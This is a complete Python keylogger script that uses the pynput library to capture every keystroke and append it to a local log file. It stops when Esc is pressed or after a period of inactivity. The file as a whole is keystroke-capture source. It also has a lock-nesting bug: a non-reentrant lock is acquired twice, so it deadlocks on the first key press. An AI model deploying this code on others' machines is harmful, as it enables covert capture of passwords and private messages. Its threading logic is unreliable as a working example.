from pynput.keyboard import Key, Listener
import time
import threading

class KeyLogger:
    def __init__(self, flush_interval=10, inactivity_timeout=15):
        self.buffer = ""
        self.flush_interval = flush_interval
        self.last_flush_time = time.time()
        self.inactivity_timeout = inactivity_timeout
        self.last_key_time = time.time()
        self.listener = Listener(on_press=self.on_press)
        self.active = True
        self.lock = threading.Lock()

    def start(self):
        self.listener.start()
        self.inactivity_thread = threading.Thread(target=self.check_inactivity)
        self.inactivity_thread.start()

    def append_to_buffer(self, data):
        with self.lock:
            self.buffer += data
            if time.time() - self.last_flush_time > self.flush_interval:
                self.flush_buffer()

    def check_inactivity(self):
        while self.active:
            time.sleep(self.inactivity_timeout)
            with self.lock:
                if time.time() - self.last_key_time > self.inactivity_timeout and self.active:
                    print("Inactivity timeout reached. Exiting Keylogger....")
                    self.flush_buffer()
                    self.stop()

    def flush_buffer(self):
        try:
            with open("log.txt", "a") as f:
                f.write(self.buffer)
        except IOError as e:
            print(f"Error writing to file: {e}")
        except Exception as e:
            print(f"An unexpected error occurred: {e}")
        finally:
            self.buffer = ""
            self.last_flush_time = time.time()

    def on_press(self, key):
        with self.lock:
            self.last_key_time = time.time()
            try:
                keydata = str(key).replace("'", "")
                mapping = {
                    'Key.space': ' ',
                    'Key.shift_r': '',
                    'Key.ctrl_l': '',
                    'Key.enter': '\n',
                    'Key.right': '',
                    'Key.backspace': ' #Previous Char Deleted# ',
                }
                keydata = mapping.get(keydata, keydata) if keydata.startswith("Key") else keydata

                self.append_to_buffer(keydata)
                if key == Key.esc:
                    self.flush_buffer()
                    self.stop()
                    return False
            except AttributeError:
                print("Error processing a key press.")
            except Exception as e:
                print(f"An unexpected error occurred: {e}")

    def stop(self):
        with self.lock:
            if self.active:
                self.active = False
                self.listener.stop()

keylogger = KeyLogger()
keylogger.start()
